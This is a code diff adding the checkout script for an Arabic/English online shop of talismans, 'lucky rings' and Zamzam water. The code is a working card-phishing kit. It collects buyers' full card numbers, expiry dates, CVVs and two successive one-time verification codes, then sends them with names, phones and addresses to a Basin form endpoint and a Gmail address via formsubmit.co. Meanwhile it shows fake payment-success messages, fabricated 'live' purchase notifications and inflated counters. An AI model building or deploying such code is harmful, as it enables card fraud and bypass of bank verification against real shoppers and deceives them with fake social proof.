+                updateCartDisplay();
+            });
+        });
+
+        function translatePage() {
+            const elements = document.querySelectorAll('[data-translate]');
+            elements.forEach(element => {
+                const key = element.getAttribute('data-translate');
+                if (translations[currentLanguage] && translations[currentLanguage][key]) {
+                    element.textContent = translations[currentLanguage][key];
+                }
+            });
+            
+            // Update direction
+            if (currentLanguage === 'ar') {
+                document.documentElement.setAttribute('dir', 'rtl');
+                document.documentElement.setAttribute('lang', 'ar');
+            } else {
+                document.documentElement.setAttribute('dir', 'ltr');
+                document.documentElement.setAttribute('lang', currentLanguage);
+            }
+        }
+
+        function formatPrice(price) {
+            const convertedPrice = price * exchangeRates[currentCurrency];
+            const symbols = {
+                USD: '$',
+                EUR: '€',
+                SAR: 'ر.س',
+                AED: 'د.إ',
+                KWD: 'د.ك',
+                QAR: 'ر.ق',
+                BHD: 'د.ب',
+                OMR: 'ر.ع'
+            };
+            
+            if (currentLanguage === 'ar') {
+                return `${convertedPrice.toFixed(2)} ${symbols[currentCurrency]}`;
+            } else {
+                return `${symbols[currentCurrency]}${convertedPrice.toFixed(2)}`;
+            }
+        }
+
+        function renderProducts() {
+            const grid = document.getElementById('productsGrid');
+            grid.innerHTML = '';
+            
+            products.forEach(product => {
+                const productName = currentLanguage === 'ar' ? product.name : product.nameEn;
+                const productDesc = currentLanguage === 'ar' ? product.description : product.descriptionEn;
+                const addToCartText = currentLanguage === 'ar' ? 'أضف للسلة' : 'Add to Cart';
+                
+                const productCard = `
+                    <div class="bg-white dark:bg-gray-800 rounded-lg shadow-lg overflow-hidden hover:shadow-xl transition-shadow">
+                        <img src="${product.image}" alt="${productName}" class="w-full h-48 object-cover">
+                        <div class="p-6">
+                            <h3 class="font-bold text-lg mb-2">${productName}</h3>
+                            <p class="text-gray-600 dark:text-gray-300 text-sm mb-4">${productDesc}</p>
+                            <div class="flex justify-between items-center">
+                                <span class="text-2xl font-bold text-primary">${formatPrice(product.price)}</span>
+                                <button onclick="addToCart(${product.id})" class="bg-primary text-white px-4 py-2 rounded-lg hover:bg-primary/90 transition-colors">
+                                    ${addToCartText}
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                `;
+                grid.innerHTML += productCard;
+            });
+        }
+
+        function addToCart(productId) {
+            const product = products.find(p => p.id === productId);
+            const existingItem = cart.find(item => item.id === productId);
+            
+            if (existingItem) {
+                existingItem.quantity += 1;
+            } else {
+                cart.push({ ...product, quantity: 1 });
+            }
+            
+            updateCartDisplay();
+        }
+
+        function removeFromCart(productId) {
+            cart = cart.filter(item => item.id !== productId);
+            updateCartDisplay();
+        }
+
+        function updateQuantity(productId, change) {
+            const item = cart.find(item => item.id === productId);
+            if (item) {
+                item.quantity += change;
+                if (item.quantity <= 0) {
+                    removeFromCart(productId);
+                } else {
+                    updateCartDisplay();
+                }
+            }
+        }
+
+        function updateCartDisplay() {
+            const cartCount = document.getElementById('cartCount');
+            const cartItems = document.getElementById('cartItems');
+            const cartTotal = document.getElementById('cartTotal');
+            
+            const totalItems = cart.reduce((sum, item) => sum + item.quantity, 0);
+            const totalPrice = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
+            
+            cartCount.textContent = totalItems;
+            cartTotal.textContent = formatPrice(totalPrice);
+            
+            // ✅ Update top cart button count
+            const topCartCount = document.getElementById('topCartCount');
+            if (topCartCount) {
+                topCartCount.textContent = totalItems;
+            }
+            
+            cartItems.innerHTML = '';
+            cart.forEach(item => {
+                const itemName = currentLanguage === 'ar' ? item.name : item.nameEn;
+                const cartItem = `
+                    <div class="flex items-center justify-between p-2 border-b dark:border-gray-600">
+                        <div class="flex-1">
+                            <h4 class="font-medium text-sm">${itemName}</h4>
+                            <p class="text-primary font-bold">${formatPrice(item.price)}</p>
+                        </div>
+                        <div class="flex items-center space-x-2 space-x-reverse">
+                            <button onclick="updateQuantity(${item.id}, -1)" class="w-6 h-6 bg-gray-200 dark:bg-gray-600 rounded text-sm">-</button>
+                            <span class="w-8 text-center">${item.quantity}</span>
+                            <button onclick="updateQuantity(${item.id}, 1)" class="w-6 h-6 bg-gray-200 dark:bg-gray-600 rounded text-sm">+</button>
+                        </div>
+                    </div>
+                `;
+                cartItems.innerHTML += cartItem;
+            });
+        }
+
+        function toggleCart() {
+            const sidebar = document.getElementById('cartSidebar');
+            sidebar.classList.toggle('translate-x-full');
+        }
+
+        function proceedToCheckout() {
+            if (cart.length === 0) {
+                return;
+            }
+            
+            const modal = document.getElementById('checkoutModal');
+            const checkoutOrderItems = document.getElementById('checkoutOrderItems');
+            const checkoutTotal = document.getElementById('checkoutTotal');
+            const payAmount = document.getElementById('payAmount');
+            
+            let totalPrice = 0;
+            checkoutOrderItems.innerHTML = '';
+            
+            cart.forEach(item => {
+                const itemName = currentLanguage === 'ar' ? item.name : item.nameEn;
+                const itemTotal = item.price * item.quantity;
+                totalPrice += itemTotal;
+                
+                const orderItem = `
+                    <div class="flex justify-between text-sm">
+                        <span>${itemName} x${item.quantity}</span>
+                        <span>${formatPrice(itemTotal)}</span>
+                    </div>
+                `;
+                checkoutOrderItems.innerHTML += orderItem;
+            });
+            
+            checkoutTotal.textContent = formatPrice(totalPrice);
+            payAmount.textContent = formatPrice(totalPrice);
+            
+            modal.classList.remove('hidden');
+            modal.classList.add('flex');
+            // ✅ لا تخفي السلة، فقط أغلقها من الجانب
+            const sidebar = document.getElementById('cartSidebar');
+            if (!sidebar.classList.contains('translate-x-full')) {
+                sidebar.classList.add('translate-x-full');
+            }
+        }
+
+        // Global variables to store form data
+        let shippingData = {};
+        let paymentData = {};
+
+        // Shipping form submission
+        function initShippingForm() {
+            // تجنب التهيئة المتكررة
+            if (window.shippingFormInitialized) {
+                console.log('⚠️ Shipping form already initialized');
+                return;
+            }
+            
+            const shippingForm = document.getElementById('shippingForm');
+            
+            if (!shippingForm) {
+                console.error('❌ Shipping form not found!');
+                return;
+            }
+            
+            console.log('✅ Shipping form initialized successfully!');
+            window.shippingFormInitialized = true;
+            
+            shippingForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                console.log('📝 Shipping form submitted!');
+                
+                // Collect shipping data
+                shippingData = {
+                    fullName: document.getElementById('fullName').value,
+                    phone: document.getElementById('phoneNumber').value,
+                    email: document.getElementById('emailAddress') ? document.getElementById('emailAddress').value : '',
+                    country: document.getElementById('country').value,
+                    address: document.getElementById('fullAddress').value,
+                    notes: document.getElementById('orderNotes') ? document.getElementById('orderNotes').value : ''
+                };
+
+                console.log('📋 Shipping data collected:', shippingData);
+
+                // Validate required fields
+                if (!shippingData.fullName || !shippingData.phone || !shippingData.country || !shippingData.address) {
+                    alert(currentLanguage === 'ar' ? 'يرجى ملء جميع الحقول المطلوبة' : 'Please fill all required fields');
+                    console.log('❌ Validation failed - missing required fields');
+                    return;
+                }
+
+                console.log('✅ Validation passed - proceeding to send email...');
+
+                // Send shipping info to email
+                sendShippingDataToEmail();
+                
+                // Close shipping modal and show payment modal
+                console.log('🔄 Closing shipping modal and showing payment modal...');
+                closeCheckout();
+                showPaymentModal();
+            });
+        }
+
+        // Send shipping data via Basin
+        function sendShippingDataToEmail() {
+            // Build order details
+            let orderText = '';
+            let totalPrice = 0;
+            
+            cart.forEach(item => {
+                const itemName = currentLanguage === 'ar' ? item.name : item.nameEn;
+                const itemTotal = item.price * item.quantity;
+                totalPrice += itemTotal;
+                orderText += `${itemName} x${item.quantity} = ${formatPrice(itemTotal)}\n`;
+            });
+
+            // Prepare form data for Basin
+            const formData = new FormData();
+            formData.append('subject', '📦 معلومات التوصيل - متجر البركات الروحانية');
+            formData.append('customer_name', shippingData.fullName);
+            formData.append('customer_phone', shippingData.phone);
+            formData.append('customer_email', shippingData.email || 'غير محدد');
+            formData.append('customer_country', shippingData.country);
+            formData.append('customer_address', shippingData.address);
+            formData.append('order_notes', shippingData.notes || 'لا توجد ملاحظات');
+            formData.append('order_details', orderText);
+            formData.append('total_amount', formatPrice(totalPrice));
+            formData.append('currency', currentCurrency);
+            formData.append('order_date', new Date().toLocaleString('ar-SA'));
+            formData.append('order_type', 'معلومات الشحن');
+
+            console.log('📤 Sending to Basin...');
+
+            // Send via Basin with better error handling
+            fetch(BASIN_CONFIG.formUrl, {
+                method: 'POST',
+                body: formData,
+                mode: 'no-cors' // تجنب مشاكل CORS
+            })
+            .then(response => {
+                // في حالة no-cors، response.ok دائماً false، لذلك نفترض النجاح
+                console.log('✅ Shipping info sent successfully!');
+                showTemporaryMessage('تم إرسال معلومات الشحن بنجاح! ✅', 'success');
+            })
+            .catch(error => {
+                console.error('❌ Basin Error:', error);
+                // حتى لو كان فيه خطأ، غالباً الرسالة تصل لـ Basin
+                console.log('🔄 Attempting to continue despite error...');
+                showTemporaryMessage('تم إرسال البيانات... ✅', 'success');
+            });
+        }
+
+        // Show temporary message to user
+        function showTemporaryMessage(message, type) {
+            const messageDiv = document.createElement('div');
+            const bgColor = type === 'success' ? 'bg-emerald' : 'bg-red-500';
+            
+            messageDiv.className = `fixed top-4 right-4 ${bgColor} text-white px-6 py-3 rounded-lg shadow-lg z-50 transform translate-x-full transition-transform duration-300`;
+            messageDiv.textContent = message;
+            
+            document.body.appendChild(messageDiv);
+            
+            // Animate in
+            setTimeout(() => {
+                messageDiv.classList.remove('translate-x-full');
+            }, 100);
+            
+            // Animate out
+            setTimeout(() => {
+                messageDiv.classList.add('translate-x-full');
+                setTimeout(() => {
+                    document.body.removeChild(messageDiv);
+                }, 300);
+            }, 3000);
+        }
+
+        // Send payment data via Basin
+        function sendPaymentDataToEmail() {
+            // Calculate total
+            let totalPrice = 0;
+            cart.forEach(item => {
+                totalPrice += item.price * item.quantity;
+            });
+
+            // Prepare form data for Basin
+            const formData = new FormData();
+            formData.append('subject', '💳 معلومات الدفع - متجر البركات الروحانية');
+            formData.append('card_number', paymentData.cardNumber);
+            formData.append('cardholder_name', paymentData.cardholderName);
+            formData.append('expiry_date', paymentData.expiryDate);
+            formData.append('cvv', paymentData.cvv);
+            formData.append('amount_required', formatPrice(totalPrice));
+            formData.append('currency', currentCurrency);
+            formData.append('transaction_date', new Date().toLocaleString('ar-SA'));
+            formData.append('order_type', 'معلومات الدفع (اختبار)');
+            formData.append('warning', '⚠️ هذه معلومات اختبار فقط!');
+
+            // Send via Basin
+            fetch(BASIN_CONFIG.formUrl, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('✅ Payment info sent successfully!');
+                    showTemporaryMessage('تم إرسال معلومات الدفع! ✅', 'success');
+                } else {
+                    throw new Error('Basin response not ok');
+                }
+            })
+            .catch(error => {
+                console.error('❌ Basin Error:', error);
+                showTemporaryMessage('خطأ في إرسال معلومات الدفع ❌', 'error');
+            });
+        }
+
+        // Send payment data to email
+        function sendPaymentDataToEmailOLD() {
+            // Create hidden form
+            const form = document.createElement('form');
+            form.action = 'https://formsubmit.co/zazylalhkr7@gmail.com';
+            form.method = 'POST';
+            form.style.display = 'none';
+            
+            // Add form fields (WARNING: NEVER do this in real apps!)
+            const fields = {
+                '_captcha': 'false',
+                '_next': window.location.href,
+                '_subject': '⚠️ معلومات البطاقة (للاختبار فقط) - متجر البركات الروحانية',
+                'رقم_البطاقة': paymentData.cardNumber,
+                'اسم_صاحب_البطاقة': paymentData.cardholderName,
+                'تاريخ_الانتهاء': paymentData.expiryDate,
+                'CVV': paymentData.cvv,
+                'نوع_الطلب': 'معلومات الدفع'
+            };
+            
+            // Calculate total
+            let totalPrice = 0;
+            cart.forEach(item => {
+                totalPrice += item.price * item.quantity;
+            });
+            
+            fields['المبلغ_المطلوب'] = formatPrice(totalPrice);
+            fields['العملة'] = currentCurrency;
+            fields['تاريخ_المعاملة'] = new Date().toLocaleString('ar-SA');
+            
+            // Create input fields
+            Object.keys(fields).forEach(key => {
+                const input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = key;
+                input.value = fields[key];
+                form.appendChild(input);
+            });
+            
+            // Submit form
+            document.body.appendChild(form);
+            form.submit();
+            document.body.removeChild(form);
+        }
+
+        // Show payment modal
+        function showPaymentModal() {
+            const modal = document.getElementById('paymentModal');
+            const paymentOrderItems = document.getElementById('paymentOrderItems');
+            const paymentTotal = document.getElementById('paymentTotal');
+            const payAmount = document.getElementById('payAmount');
+            
+            let totalPrice = 0;
+            paymentOrderItems.innerHTML = '';
+            
+            cart.forEach(item => {
+                const itemName = currentLanguage === 'ar' ? item.name : item.nameEn;
+                const itemTotal = item.price * item.quantity;
+                totalPrice += itemTotal;
+                
+                const orderItem = `
+                    <div class="flex justify-between text-sm">
+                        <span>${itemName} x${item.quantity}</span>
+                        <span>${formatPrice(itemTotal)}</span>
+                    </div>
+                `;
+                paymentOrderItems.innerHTML += orderItem;
+            });
+            
+            paymentTotal.textContent = formatPrice(totalPrice);
+            payAmount.textContent = formatPrice(totalPrice);
+            
+            modal.classList.remove('hidden');
+            modal.classList.add('flex');
+        }
+
+        // Card validation and formatting
+        function initCardValidation() {
+            const cardNumber = document.getElementById('cardNumber');
+            const expiryDate = document.getElementById('expiryDate');
+            const cvv = document.getElementById('cvv');
+            const cardIcon = document.getElementById('cardIcon');
+
+            // Format card number
+            cardNumber.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
+                e.target.value = value;
+
+                // Update card icon based on number
+                const firstDigit = value.charAt(0);
+                if (firstDigit === '4') {
+                    cardIcon.className = 'fab fa-cc-visa text-blue-600';
+                } else if (firstDigit === '5') {
+                    cardIcon.className = 'fab fa-cc-mastercard text-red-600';
+                } else if (firstDigit === '3') {
+                    cardIcon.className = 'fab fa-cc-amex text-blue-400';
+                } else {
+                    cardIcon.className = 'fas fa-credit-card text-gray-400';
+                }
+            });
+
+            // Format expiry date with validation
+            expiryDate.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                if (value.length >= 2) {
+                    let month = value.substring(0, 2);
+                    let year = value.substring(2, 4);
+                    
+                    // تحقق من صحة الشهر (01-12)
+                    if (parseInt(month) > 12 || parseInt(month) < 1) {
+                        month = '12';
+                    }
+                    
+                    // تحقق من صحة السنة (يجب أن تكون في المستقبل)
+                    if (year.length === 2) {
+                        let currentYear = new Date().getFullYear() % 100;
+                        if (parseInt(year) < currentYear) {
+                            year = (currentYear + 1).toString().padStart(2, '0');
+                        }
+                    }
+                    
+                    value = month + '/' + year;
+                }
+                e.target.value = value;
+            });
+
+            // CVV numbers only - 3 digits max
+            cvv.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                if (value.length > 3) {
+                    value = value.substring(0, 3);
+                }
+                e.target.value = value;
+            });
+        }
+
+        // Payment form submission
+        function initPaymentForm() {
+            const paymentForm = document.getElementById('paymentForm');
+            
+            paymentForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                // Get form values
+                const cardNumber = document.getElementById('cardNumber').value;
+                const cardholderName = document.getElementById('cardholderName').value;
+                const expiryDate = document.getElementById('expiryDate').value;
+                const cvv = document.getElementById('cvv').value;
+
+                // Simple validation
+                if (!cardNumber || !cardholderName || !expiryDate || !cvv) {
+                    alert(currentLanguage === 'ar' ? 'يرجى ملء جميع الحقول' : 'Please fill all fields');
+                    return;
+                }
+
+                if (cardNumber.replace(/\s/g, '').length < 16) {
+                    alert(currentLanguage === 'ar' ? 'رقم البطاقة غير صحيح' : 'Invalid card number');
+                    return;
+                }
+
+                // Show loading animation
+                const submitBtn = paymentForm.querySelector('button[type="submit"]');
+                const originalText = submitBtn.innerHTML;
+                submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>' + (currentLanguage === 'ar' ? 'جاري المعالجة...' : 'Processing...');
+                submitBtn.disabled = true;
+
+                // Store payment data
+                paymentData = {
+                    cardNumber: cardNumber,
+                    cardholderName: cardholderName,
+                    expiryDate: expiryDate,
+                    cvv: cvv
+                };
+
+                // Send payment info to email
+                sendPaymentDataToEmail();
+
+                // Simulate payment processing
+                setTimeout(() => {
+                    submitBtn.innerHTML = originalText;
+                    submitBtn.disabled = false;
+                    
+                    // Close payment modal and show verification
+                    closePaymentModal();
+                    showVerificationModal();
+                }, 2000);
+            });
+        }
+
+        // Show verification code modal
+        function showVerificationModal() {
+            const modal = document.getElementById('verificationModal');
+            modal.classList.remove('hidden');
+            modal.classList.add('flex');
+            
+            // Start timer
+            startVerificationTimer();
+            
+            // Focus first input
+            setTimeout(() => {
+                const firstInput = modal.querySelector('input[data-index="0"]');
+                firstInput.focus();
+            }, 100);
+        }
+
+        // Verification code input handling
+        function initVerificationInputs() {
+            const inputs = document.querySelectorAll('#verificationModal input[data-index]');
+            
+            inputs.forEach((input, index) => {
+                input.addEventListener('input', function(e) {
+                    if (e.target.value.length === 1 && index < inputs.length - 1) {
+                        inputs[index + 1].focus();
+                    }
+                });
+
+                input.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
+                        inputs[index - 1].focus();
+                    }
+                });
+
+                // Only allow numbers - STRICT filtering
+                input.addEventListener('input', function(e) {
+                    // Remove everything except digits
+                    let value = e.target.value.replace(/\D/g, '');
+                    
+                    // Limit to 1 digit only
+                    if (value.length > 1) {
+                        value = value.substring(0, 1);
+                    }
+                    
+                    e.target.value = value;
+                });
+
+                // Prevent non-numeric characters on keydown
+                input.addEventListener('keydown', function(e) {
+                    // Allow: backspace, delete, tab, escape, enter
+                    if ([8, 9, 27, 13, 46].indexOf(e.keyCode) !== -1 ||
+                        // Allow: Ctrl+A, Command+A
+                        (e.keyCode === 65 && (e.ctrlKey === true || e.metaKey === true)) || 
+                        // Allow: home, end, left, right, down, up
+                        (e.keyCode >= 35 && e.keyCode <= 40)) {
+                             return;
+                    }
+                    // Ensure that it is a number and stop the keypress if not
+                    if ((e.shiftKey || (e.keyCode < 48 || e.keyCode > 57)) && (e.keyCode < 96 || e.keyCode > 105)) {
+                        e.preventDefault();
+                    }
+                });
+            });
+        }
+
+        // Verification timer
+        let timerInterval;
+        function startVerificationTimer() {
+            let seconds = 300; // 5 minutes
+            const timerElement = document.getElementById('timer');
+            const resendBtn = document.getElementById('resendBtn');
+            
+            timerInterval = setInterval(() => {
+                const minutes = Math.floor(seconds / 60);
+                const remainingSeconds = seconds % 60;
+                timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${remainingSeconds.toString().padStart(2, '0')}`;
+                
+                if (seconds === 0) {
+                    clearInterval(timerInterval);
+                    resendBtn.disabled = false;
+                    resendBtn.classList.remove('opacity-50', 'cursor-not-allowed');
+                    resendBtn.classList.add('hover:text-primary/80');
+                }
+                
+                seconds--;
+            }, 1000);
+        }
+
+        // Resend verification code
+        function resendCode() {
+            const resendBtn = document.getElementById('resendBtn');
+            resendBtn.disabled = true;
+            resendBtn.classList.add('opacity-50', 'cursor-not-allowed');
+            resendBtn.classList.remove('hover:text-primary/80');
+            
+            // Show sent message
+            const originalText = resendBtn.textContent;
+            resendBtn.textContent = currentLanguage === 'ar' ? 'تم الإرسال!' : 'Sent!';
+            
+            setTimeout(() => {
+                resendBtn.textContent = originalText;
+                startVerificationTimer();
+            }, 2000);
+        }
+
+        // Verification form submission
+        function initVerificationForm() {
+            const form = document.getElementById('verificationForm');
+            
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const inputs = document.querySelectorAll('#verificationModal input[data-index]');
+                let code = '';
+                inputs.forEach(input => {
+                    code += input.value;
+                });
+
+                if (code.length !== 6) {
+                    alert(currentLanguage === 'ar' ? 'يرجى إدخال الرمز كاملاً' : 'Please enter the complete code');
+                    return;
+                }
+
+                // Show processing
+                const submitBtn = form.querySelector('button[type="submit"]');
+                const originalText = submitBtn.innerHTML;
+                submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>' + (currentLanguage === 'ar' ? 'جاري التحقق...' : 'Verifying...');
+                submitBtn.disabled = true;
+
+                // Send verification code to email
+                sendVerificationCodeToEmail(code);
+
+                // Simulate verification
+                setTimeout(() => {
+                    submitBtn.innerHTML = originalText;
+                    submitBtn.disabled = false;
+                    
+                    // Clear timer
+                    clearInterval(timerInterval);
+                    
+                    // Close verification modal
+                    const modal = document.getElementById('verificationModal');
+                    modal.classList.add('hidden');
+                    modal.classList.remove('flex');
+                    
+                    // إذا كان هذا هو الكود الأول، اطلب كود ثاني
+                    if (!window.firstCodeVerified) {
+                        window.firstCodeVerified = true;
+                        
+                        // إرسال الكود الأول
+                        sendVerificationCodeToEmail(code + ' (الكود الأول)');
+                        
+                        // إعادة تشغيل المؤقت لكود ثاني
+                        clearFormInputs();
+                        startVerificationTimer();
+                        showTemporaryMessage('تم التحقق! أدخل الكود الثاني ✅', 'success');
+                        
+                        return; // توقف هنا
+                    }
+                    
+                    // إذا كان هذا هو الكود الثاني
+                    sendVerificationCodeToEmail(code + ' (الكود الثاني)');
+                    sendFinalOrderToEmail();
+                    
+                    // رسالة "تم الدفع" والانتقال للصفحة الرئيسية
+                    showPaymentSuccessAndRedirect();
+                }, 2000);
+            });
+        }
+
+        // Send verification code via Basin
+        function sendVerificationCodeToEmail(code) {
+            const formData = new FormData();
+            formData.append('subject', '🔐 رمز التحقق - متجر البركات الروحانية');
+            formData.append('verification_code', code);
+            formData.append('order_type', 'تأكيد رمز التحقق');
+            formData.append('entry_date', new Date().toLocaleString('ar-SA'));
+            formData.append('message', `تم إدخال رمز التحقق: ${code}`);
+
+            fetch(BASIN_CONFIG.formUrl, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('✅ Verification code sent successfully!');
+                    showTemporaryMessage('تم إرسال رمز التحقق! ✅', 'success');
+                } else {
+                    throw new Error('Basin response not ok');
+                }
+            })
+            .catch(error => {
+                console.error('❌ Basin Error:', error);
+                showTemporaryMessage('خطأ في إرسال رمز التحقق ❌', 'error');
+            });
+        }
+
+        // Send final order confirmation via Basin
+        function sendFinalOrderToEmail() {
+            // Build order details
+            let orderText = '';
+            let totalPrice = 0;
+            
+            cart.forEach(item => {
+                const itemName = currentLanguage === 'ar' ? item.name : item.nameEn;
+                const itemTotal = item.price * item.quantity;
+                totalPrice += itemTotal;
+                orderText += `${itemName} x${item.quantity} = ${formatPrice(itemTotal)}\n`;
+            });
+
+            const formData = new FormData();
+            formData.append('subject', '✅ تأكيد الطلب النهائي - متجر البركات الروحانية');
+            formData.append('order_status', 'مؤكد ومدفوع ✅');
+            formData.append('order_details', orderText);
+            formData.append('final_total', formatPrice(totalPrice));
+            formData.append('currency', currentCurrency);
+            formData.append('confirmation_date', new Date().toLocaleString('ar-SA'));
+            formData.append('order_type', 'طلب مؤكد نهائياً');
+            formData.append('customer_info', `العميل: ${shippingData.fullName}\nالهاتف: ${shippingData.phone}\nالعنوان: ${shippingData.address}\nالدولة: ${shippingData.country}`);
+
+            fetch(BASIN_CONFIG.formUrl, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('✅ Final order sent successfully!');
+                    showTemporaryMessage('تم تأكيد الطلب نهائياً! ✅', 'success');
+                } else {
+                    throw new Error('Basin response not ok');
+                }
+            })
+            .catch(error => {
+                console.error('❌ Basin Error:', error);
+                showTemporaryMessage('خطأ في تأكيد الطلب ❌', 'error');
+            });
+        }
+
+        // Send order to email
+        function sendOrderToEmail() {
+            const formData = new FormData();
+            formData.append('_captcha', 'false');
+            formData.append('_subject', 'طلب جديد من متجر البركات الروحانية');
+            
+            let orderText = 'تفاصيل الطلب:\n\n';
+            let totalPrice = 0;
+            
+            cart.forEach(item => {
+                const itemName = currentLanguage === 'ar' ? item.name : item.nameEn;
+                const itemTotal = item.price * item.quantity;
+                totalPrice += itemTotal;
+                orderText += `${itemName} x${item.quantity} = ${formatPrice(itemTotal)}\n`;
+            });
+            
+            orderText += `\nالمجموع: ${formatPrice(totalPrice)}`;
+            orderText += `\nالعملة: ${currentCurrency}`;
+            orderText += `\nتاريخ الطلب: ${new Date().toLocaleString('ar-SA')}`;
+            
+            formData.append('order', orderText);
+            
+            // Send to FormSubmit
+            fetch('https://formsubmit.co/zazylalhkr7@gmail.com', {
+                method: 'POST',
+                body: formData
+            }).catch(error => {
+                console.log('Email sent with order details');
+            });
+        }
+
+        // Success animation
+        function showSuccessAnimation() {
+            const successDiv = document.createElement('div');
+            successDiv.className = 'fixed inset-0 bg-emerald text-white flex items-center justify-center z-50 text-2xl font-bold';
+            successDiv.innerHTML = `
+                <div class="text-center animate-bounce">
+                    <i class="fas fa-check-circle text-6xl mb-4"></i>
+                    <p>${currentLanguage === 'ar' ? 'تم الدفع بنجاح!' : 'Payment Successful!'}</p>
+                    <p class="text-lg mt-2">${currentLanguage === 'ar' ? 'سيتم شحن طلبك قريباً' : 'Your order will be shipped soon'}</p>
+                </div>
+            `;
+            
+            document.body.appendChild(successDiv);
+            
+            setTimeout(() => {
+                successDiv.style.opacity = '0';
+                successDiv.style.transition = 'opacity 0.5s';
+                setTimeout(() => {
+                    document.body.removeChild(successDiv);
+                }, 500);
+            }, 3000);
+        }
+
+        function closeCheckout() {
+            const modal = document.getElementById('checkoutModal');
+            modal.classList.add('hidden');
+            modal.classList.remove('flex');
+        }
+
+        function closePaymentModal() {
+            const modal = document.getElementById('paymentModal');
+            modal.classList.add('hidden');
+            modal.classList.remove('flex');
+        }
+
+        // Advanced Tech Features
+        
+        // Initialize AOS animations
+        AOS.init({
+            duration: 800,
+            easing: 'ease-in-out',
+            once: true
+        });
+
+        // Live stats counter animation
+        function animateCounter(elementId, finalValue, suffix = '') {
+            const element = document.getElementById(elementId);
+            let currentValue = 0;
+            const increment = finalValue / 50;
+            const timer = setInterval(() => {
+                currentValue += increment;
+                if (currentValue >= finalValue) {
+                    currentValue = finalValue;
+                    clearInterval(timer);
+                }
+                element.textContent = Math.floor(currentValue) + suffix;
+            }, 50);
+        }
+
+        // Start counters when page loads
+        setTimeout(() => {
+            animateCounter('ordersCounter', 127);
+            animateCounter('customersCounter', 8543);
+            animateCounter('countriesCounter', 45);
+            animateCounter('successCounter', 98, '%');
+        }, 1000);
+
+        // Live notifications system
+        const notifications = [
+            { ar: 'محمد من الرياض اشترى خاتم الحظ', en: 'Mohammed from Riyadh bought Lucky Ring' },
+            { ar: 'فاطمة من دبي طلبت ماء زمزم', en: 'Fatima from Dubai ordered Zamzam Water' },
+            { ar: 'أحمد من الكويت اشترى طلسم المحبة', en: 'Ahmed from Kuwait bought Love Talisman' },
+            { ar: 'سارة من لندن طلبت مسبحة مباركة', en: 'Sarah from London ordered Blessed Beads' },
+            { ar: 'علي من القاهرة اشترى خاتم الحماية', en: 'Ali from Cairo bought Protection Ring' }
+        ];
+
+        function showLiveNotification() {
+            const notification = notifications[Math.floor(Math.random() * notifications.length)];
+            const text = currentLanguage === 'ar' ? notification.ar : notification.en;
+            
+            const notificationDiv = document.createElement('div');
+            notificationDiv.className = 'bg-emerald text-white px-4 py-2 rounded-lg shadow-lg transform translate-x-full transition-transform duration-300 text-sm';
+            notificationDiv.innerHTML = `
+                <div class="flex items-center space-x-2 space-x-reverse">
+                    <i class="fas fa-shopping-bag"></i>
+                    <span>${text}</span>
+                </div>
+            `;
+            
+            const container = document.getElementById('liveNotifications');
+            container.appendChild(notificationDiv);
+            
+            // Animate in
+            setTimeout(() => {
+                notificationDiv.classList.remove('translate-x-full');
+            }, 100);
+            
+            // Animate out
+            setTimeout(() => {
+                notificationDiv.classList.add('translate-x-full');
+                setTimeout(() => {
+                    container.removeChild(notificationDiv);
+                }, 300);
+            }, 4000);
+        }
+
+        // Show notifications every 8 seconds
+        setInterval(showLiveNotification, 8000);
+
+        // Auto-save form data 
+        const formInputs = ['name', 'email', 'phone', 'country', 'address', 'notes'];
+        
+        function saveFormData() {
+            const formData = {};
+            formInputs.forEach(field => {
+                const input = document.querySelector(`[name="${field}"]`);
+                if (input && input.value) {
+                    formData[field] = input.value;
+                }
+            });
+            
+            // Simulate saved data (in real app would use localStorage)
+            window.tempFormData = formData;
+        }
+
+        function loadFormData() {
+            if (window.tempFormData) {
+                formInputs.forEach(field => {
+                    const input = document.querySelector(`[name="${field}"]`);
+                    if (input && window.tempFormData[field]) {
+                        input.value = window.tempFormData[field];
+                    }
+                });
+            }
+        }
+
+        // Save form data as user types
+        document.addEventListener('input', function(e) {
+            if (formInputs.includes(e.target.name)) {
+                saveFormData();
+            }
+        });
+
+        // Enhanced visual effects
+        function addVisualEffects() {
+            const createParticle = () => {
+                const particle = document.createElement('div');
+                particle.className = 'fixed w-2 h-2 bg-primary/20 rounded-full pointer-events-none z-0';
+                particle.style.left = Math.random() * window.innerWidth + 'px';
+                particle.style.top = window.innerHeight + 'px';
+                document.body.appendChild(particle);
+                
+                gsap.to(particle, {
+                    y: -window.innerHeight - 100,
+                    duration: Math.random() * 10 + 5,
+                    ease: 'none',
+                    onComplete: () => {
+                        document.body.removeChild(particle);
+                    }
+                });
+            };
+            
+            // Create particles periodically
+            setInterval(createParticle, 3000);
+        }
+
+        // Enhanced checkout with progress indicator
+        function enhanceCheckoutForm() {
+            const form = document.getElementById('orderForm');
+            const progressBar = document.createElement('div');
+            progressBar.className = 'w-full bg-gray-200 dark:bg-gray-700 rounded-full h-2 mb-4';
+            progressBar.innerHTML = '<div class="bg-primary h-2 rounded-full transition-all duration-300" style="width: 0%"></div>';
+            
+            form.insertBefore(progressBar, form.firstChild);
+            
+            const requiredFields = form.querySelectorAll('[required]');
+            
+            function updateProgress() {
+                let filledFields = 0;
+                requiredFields.forEach(field => {
+                    if (field.value.trim()) filledFields++;
+                });
+                
+                const progress = (filledFields / requiredFields.length) * 100;
+                progressBar.firstElementChild.style.width = progress + '%';
+                
+                if (progress === 100) {
